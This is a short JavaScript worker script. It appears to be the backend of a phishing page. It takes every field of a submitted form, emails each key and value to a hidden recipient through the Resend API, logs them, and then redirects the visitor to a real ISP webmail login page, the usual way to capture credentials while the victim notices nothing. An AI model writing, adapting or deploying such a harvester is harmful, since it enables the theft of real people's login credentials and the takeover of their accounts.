import { Resend } from 'resend';

export default {
  async fetch(request, env) {
    const resend = new Resend(env.ResendAPIKEY);

    if(request.method === "POST"){
      const formData = await request.formData();
      for (const [key, value] of formData.entries()) {

      resend.emails.send({
        from: 'onboarding@resend.dev',
        to: `${env.Recepient}`,
        subject: 'Hello World',
        html: `<p>Congrats on sending your <strong>first email</strong>!</p> /n/n 
          ${key}: ${value}`,
      });
        console.log(`${key}: ${value}`);
      }
      return Response.redirect("https://webmail.hawaiiantel.net/", 302);
    }
    return new Response('Not allowed', {status: 400});
  },
};